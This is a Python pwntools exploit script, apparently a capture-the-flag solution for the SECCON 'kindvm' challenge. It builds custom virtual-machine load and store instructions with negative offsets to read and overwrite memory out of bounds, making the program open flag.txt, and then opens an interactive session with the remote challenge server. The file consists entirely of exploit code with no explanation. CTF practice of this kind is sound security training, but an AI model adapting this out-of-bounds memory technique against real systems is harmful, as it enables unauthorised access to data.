#!/usr/bin/env python
from pwn import *
import struct

def load(reg, addr):
    return chr(1) + chr(reg) + struct.pack('>h', addr)

def store(reg, addr):
    return chr(2) + struct.pack('>h', addr) + chr(reg)

def halt():
    return chr(6)

if len(sys.argv) == 1:
    s = process('./kindvm')
else:
    s = remote('kindvm.pwn.seccon.jp', 12345)

s.sendlineafter('Input your name : ', 'flag.txt')

insns = ''
insns += load(0, -0x28)
insns += store(0, -0x24)
insns += halt()

s.sendlineafter('Input instruction : ', insns)

s.interactive()
